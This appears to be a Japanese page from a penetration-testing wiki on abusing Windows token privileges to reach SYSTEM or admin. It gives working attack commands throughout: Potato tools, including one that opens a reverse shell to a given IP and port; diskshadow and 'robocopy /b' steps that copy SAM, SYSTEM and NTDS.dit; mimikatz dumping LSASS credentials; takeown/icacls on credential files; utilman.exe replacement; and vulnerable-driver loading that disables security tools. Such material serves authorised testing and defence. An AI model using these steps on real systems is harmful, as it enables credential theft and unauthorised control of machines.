# Tokens の悪用

{{#include ../../banners/hacktricks-training.md}}

## Tokens

**Windows Access Tokens** について知らない場合は、続ける前にこちらを読んでください:


{{#ref}}
access-tokens.md
{{#endref}}

**すでに保持している tokens を悪用して、権限を昇格できる場合があります。**

### SeImpersonatePrivilege

この特権があると、プロセスは token のハンドルを取得できる場合に、その token を impersonate できます（作成はできません）。Windows service (DCOM) に exploit への NTLM authentication を強制させることで、privileged token を取得でき、その後 SYSTEM 権限でプロセスを実行できます。<sup>[[2]](#references)</sup> この手法は、[JuicyPotato](https://github.com/ohpe/juicy-potato)、[RogueWinRM](https://github.com/antonioCoco/RogueWinRM)（WinRM が無効であることが必要）、[SweetPotato](https://github.com/CCob/SweetPotato)、[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) などのツールで悪用できます。

loopback のみで待ち受ける Web application は、ローカルユーザーが、より高い権限の identity で呼び出し元が指定した URL にリクエストを送る authenticated endpoint にアクセスできる場合、別の coercion の手掛かりになります。endpoint の authorization と URL 制限、実際の outbound client の identity と authentication の挙動、さらにその client が低権限ユーザーの制御下にある listener に接続できるかを確認してください。`SeImpersonatePrivilege` が有効であること、IIS listener があること、URL-fetch parameter があることだけでは、privileged token や権限昇格の経路があるとは判断できません。この確認は passive に行い、enumeration 中に coercion request を送信しないでください。Microsoft の [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) および [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) のドキュメントを参照してください。

最近の operator 向けメモ:

- **JuicyPotato はレガシーです**: Windows 10 1809+/Server 2019+ では、到達可能な RPC/COM surface に応じて **GodPotato**、**SigmaPotato**、**PrintNotifyPotato**、**RoguePotato**、**SharpEfsPotato/EfsPotato**、または **PrintSpoofer** を優先してください。
- **`LOCAL SERVICE`** または **`NETWORK SERVICE`** として実行される service を侵害し、`whoami /priv` が `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` のない **filtered token** を示す場合は、まずそのアカウントの **default privilege set** を復元してから（たとえば **FullPowers** を使って）、改めて Potato 系を試してください。<sup>[[3]](#references)</sup>
- 新しい fork の中には、元のツールより operator に使いやすいものがあります。たとえば **SigmaPotato** は reflection/in-memory execution と最新の Windows との互換性を追加し、**PrintNotifyPotato** は PrintNotify COM service を悪用するため、従来の Spooler 経由が無効な場合に役立つことがよくあります。

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

**SeImpersonatePrivilege**と非常によく似ており、特権トークンを取得するために**同じ手法**を使用します。\
この権限を使うと、新規プロセスまたは一時停止中のプロセスに**プライマリトークンを割り当てる**ことができます。特権付きの偽装トークンから、プライマリトークンを派生させることができます（DuplicateTokenEx）。\
このトークンを使って、'CreateProcessAsUser'で**新しいプロセス**を作成するか、プロセスを一時停止状態で作成して**トークンを設定**できます（通常、実行中のプロセスのプライマリトークンは変更できません）。<sup>[[2]](#references)</sup>

### SeTcbPrivilege

このトークンが有効になっている場合、**KERB_S4U_LOGON**を使用して、認証情報を知らなくても他の任意のユーザーの**偽装トークン**を取得できます。また、トークンに任意のグループ（admins）を**追加**し、トークンの**整合性レベル**を「**medium**」に設定して、そのトークンを**現在のスレッド**に割り当てることができます（SetThreadToken）。<sup>[[2]](#references)</sup>

### SeBackupPrivilege

この権限により、システムはあらゆるファイルに対するすべての読み取りアクセスを許可します（読み取り操作に限定）。ローカルAdministratorアカウントのパスワードハッシュをレジストリから**読み取る**ために利用でき、その後、ハッシュを使って「**psexec**」や「**wmiexec**」などのツールを使用できます（Pass-the-Hash technique）。ただし、Local Administratorアカウントが無効になっている場合、またはリモート接続するLocal Administratorから管理者権限を剥奪するポリシーが設定されている場合、この手法は失敗します。<sup>[[2]](#references)</sup>\
実際には、最も信頼性の高い組み込みの手順は、通常**VSS + `robocopy /b`**です。シャドウコピーを作成して公開し、**backup mode**で`SAM`/`SYSTEM`または`NTDS.dit`をコピーすることで、ファイルACLを回避します。<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

この**権限を悪用**するには、以下を利用できます。

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec) で **IppSec** の解説を確認する
- または、以下の「Backup Operators による権限昇格」のセクションで説明されている方法を使います。


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

この権限により、ファイルの Access Control List (ACL) に関係なく、あらゆるシステムファイルへの**書き込みアクセス**が可能になります。これにより、**サービスの変更**、DLL Hijacking の実行、Image File Execution Options による**デバッガー**の設定など、さまざまな権限昇格の手段が利用可能になります。<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege は強力な権限です。ユーザーがトークンを偽装できる場合に特に有用ですが、SeImpersonatePrivilege がない場合にも役立ちます。この機能を利用するには、現在のプロセスと同じユーザーを表し、整合性レベルが現在のプロセスのものを超えないトークンを偽装できる必要があります。<sup>[[2]](#references)</sup>

**主なポイント:**

- **SeImpersonatePrivilege を使わない偽装:** 特定の条件下では、SeCreateTokenPrivilege を利用してトークンを偽装し、EoP を実現できます。
- **トークン偽装の条件:** 偽装を成功させるには、対象のトークンが同じユーザーに属し、整合性レベルが偽装を試みるプロセスの整合性レベル以下である必要があります。
- **偽装トークンの作成と変更:** ユーザーは偽装トークンを作成し、特権グループの SID (Security Identifier) を追加して強化できます。

### SeLoadDriverPrivilege

この権限を使うと、特定の `ImagePath` および `Type` の値を持つレジストリエントリを作成することで、プロセスが**デバイスドライバーをロードおよびアンロード**できます。`HKLM` (HKEY_LOCAL_MACHINE) への直接の書き込みアクセスは制限されているため、代わりに `HKCU` (HKEY_CURRENT_USER) を使用できます。ただし、`HKCU` エントリをカーネルがドライバー構成として認識できるようにするには、特定のパスが必要です。<sup>[[2]](#references)</sup>

現在の攻撃で一般的に使われるのは **BYOVD** (脆弱なドライバーを持ち込む手法) です。**署名済みだが脆弱な**カーネルドライバーをロードし、その IOCTL を使って保護機能を無効化するか、カーネルコード実行に移行します。最近の Windows 11/Server ビルドでは、**Microsoft の脆弱なドライバーのブロックリスト**や **HVCI/Memory Integrity** によって、古い公開攻撃チェーンが使えなくなることが多いため、従来の `szkg64.sys` 系の例が常に有効とは限らない点に注意してください。

このパスは `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` です。ここで `<RID>` は現在のユーザーの Relative Identifier です。`HKCU` 内にこのパス全体を作成し、次の2つの値を設定する必要があります。<sup>[[2]](#references)</sup>

- 実行するバイナリへのパスである `ImagePath`
- `SERVICE_KERNEL_DRIVER` (`0x00000001`) を値に持つ `Type`

**手順:**

1. 書き込みアクセスが制限されているため、`HKLM` ではなく `HKCU` にアクセスします。
2. `<RID>` が現在のユーザーの Relative Identifier を表すものとして、`HKCU` 内に `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` というパスを作成します。
3. `ImagePath` にバイナリの実行パスを設定します。
4. `Type` に `SERVICE_KERNEL_DRIVER` (`0x00000001`) を割り当てます。

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

この権限を悪用するその他の方法: [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

これは **SeRestorePrivilege** と似ています。主な機能は、WRITE_OWNER アクセス権を付与して明示的な随意アクセス制御の要件を回避し、プロセスが**オブジェクトの所有権を取得できるようにする**ことです。この処理では、まず対象のレジストリキーの所有権を取得して書き込み可能にし、次に DACL を変更して書き込み操作を許可します。<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

この特権を使うと、メモリの読み書きを含め、**他のプロセスをデバッグ**できます。この特権があれば、ほとんどのアンチウイルスやホスト侵入防止ソリューションを回避できる、さまざまなメモリインジェクション手法を利用できます。<sup>[[2]](#references)</sup>

最新のWindowsでは、`SeDebugPrivilege`があれば通常、**保護されていないSYSTEMプロセス**を開いてトークンを複製できます。ただし、**LSASS**にアクセスできる保証はありません。**RunAsPPL / LSA Protection**が有効な場合、`SeDebugPrivilege`があっても、保護されていないプロセスからLSASSを読み取ったり、インジェクションしたりすることはできません。その場合は、別の非PPLのSYSTEMプロセスからトークンを盗むか、`procdump`が使えると決めつけずに、PPL bypass/BYOVDと組み合わせてください。`SeDebugPrivilege` + `SeImpersonatePrivilege`を使ったトークンコピーの完全な例は、[こちらのページ](sedebug-+-seimpersonate-copy-token.md)を確認してください。

#### メモリをダンプする

[SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)の[ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)を使って、**プロセスのメモリを取得**できます。具体的には、ユーザーがシステムへのログインに成功した後にユーザーの認証情報を保存する、**Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**プロセスに対して利用できます。

その後、このダンプをmimikatzに読み込ませることで、パスワードを取得できます:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

以前に保存された読み取り可能な LSASS dump があれば、現在のアカウントに稼働中の保護されたプロセスを取得する権限がなくても利用できる場合があります。dump ファイルや同様の名前のアーカイブは手掛かりとしてのみ扱ってください。アクセス権と内容を確認し、復元された認証情報がまだ有効か、より高い権限のコンテキストを取得できるかを評価します。ファイル名だけでは、アーカイブに dump が含まれていることや、認証情報を再利用できることの証明にはなりません。

#### RCE

`NT SYSTEM` shell を取得するには、次の方法を使用できます。

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

この権限（ボリュームの保守タスクを実行する）は、特権を要するボリューム操作を可能にする場合がありますが、それだけで読み取り可能な raw-volume ハンドルや任意のファイルへのアクセスが保証されるわけではありません。デバイス ACL、token の状態、Windows のバージョン、要求する操作も関係します。許可されたボリューム制御操作によって、代わりにファイルシステム ACL が変更される場合があります。これは変更を伴う、ボリューム全体に影響する可能性のある操作です。CA ホストで証明書を悪用するには、使用可能な秘密鍵マテリアルへのアクセスも必要です。また、EFS で保護されたファイルには、引き続き認証済みの復号キーまたは回復キーが必要です。詳しい前提条件については、以下を参照してください。<sup>[[5]](#references)</sup>

詳細な手法と緩和策については、以下を参照してください。

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## 権限を確認する

```
whoami /priv
```

**Disabled** と表示されている **tokens** は通常有効化できるため、_Enabled_ と _Disabled_ の両方の privileges を悪用できることがよくあります。

### すべての tokens を有効化する

無効化された privileges がある場合は、スクリプト [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) を使用して、すべての tokens を有効化できます。

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Or [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) に埋め込まれた **script**。

## Table

すべての token privileges のチートシートは [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) にあります。以下の概要では、権限を直接悪用して admin session を取得する方法、または機密ファイルを読み取る方法のみを記載します。<sup>[[1]](#references)</sup>

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"この権限を使うと、ユーザーは token を偽装し、potato.exe、rottenpotato.exe、juicypotato.exe などのツールを使って nt system へ privesc できます。"_                                                                                                                                                                                                      | 更新してくれた [Aurélien Chalot](https://twitter.com/Defte_) に感謝します。近いうちに、よりレシピ形式に近い説明に書き直す予定です。                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**組み込みコマンド**_ | `robocopy /b` または SeBackup 対応の専用コピー helper を使って機密ファイルを読み取ります。                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`、`SECURITY`、`NTDS.dit`、場合によっては `%WINDIR%\MEMORY.DMP` の取得に有効です。<br><br>- `robocopy` は便利ですが、ロック中または使用中のファイルには、専用の SeBackup cmdlet/API のほうが柔軟に対応できます。</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken` を使って、ローカル admin 権限を含む任意の token を作成します。                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **PPL で保護されていない** SYSTEM token を複製するか、保護されていないプロセスのメモリをダンプします。                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection が有効な場合、LSASS のダンプは一般にブロックされます。</p><p>script は [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) にあります。</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | **Potato family** / named-pipe impersonation を使って SYSTEM を起動します（`PrintSpoofer`、`RoguePotato`、`GodPotato`、`SigmaPotato`、`PrintNotifyPotato` など）。                                                                                                                                                                                    | <p>IIS APPPOOL、MSSQL、scheduled tasks などの service account、またはすでに `SeImpersonatePrivilege` を持つコンテキストで特に実用的です。</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. 署名済みだが脆弱な kernel driver（BYOVD）をロードする<br>2. driver の IOCTL を使って kernel R/W を取得し、security tooling を無効化するか、SYSTEM に昇格する<br><br>または、この権限を使って、組み込みコマンドの <code>fltMC</code>（例: <code>fltMC sysmondrv</code>）で security 関連 driver をアンロードすることもできます。</p>                     | <p><code>szkg64.sys</code> などの古い公開 driver は、脆弱な driver の blocklist / HVCI によって、最新の Windows ではブロックされるケースが増えています。</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore 権限が付与された状態で PowerShell/ISE を起動します。<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>) で権限を有効にします。<br>3. utilman.exe を utilman.old にリネームします<br>4. cmd.exe を utilman.exe にリネームします<br>5. console をロックして Win+U を押します</p> | <p>一部の AV software に攻撃を検出される可能性があります。</p><p>別の方法では、同じ権限を使って "Program Files" 内にある service binary を置き換えます。</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**組み込みコマンド**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe を utilman.exe にリネームします<br>4. console をロックして Win+U を押します</p>                                                                                                                                       | <p>一部の AV software に攻撃を検出される可能性があります。</p><p>別の方法では、同じ権限を使って "Program Files" 内にある service binary を置き換えます。</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>token を操作して、ローカル admin 権限を含めます。SeImpersonate が必要な場合があります。</p><p>要検証。</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - Windows の権限から admin へ至る exploitation path](https://github.com/gtworek/Priv2Admin)
- [2] [Token Privileges を LPE に悪用する方法](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Privileges を返してくれませんか？](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy（`/b` backup mode による file/folder ACL check の回避）](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – volume maintenance tasks の実行（SeManageVolumePrivilege）](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate（SeManageVolumePrivilege → CA key の exfil → Golden Certificate）](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
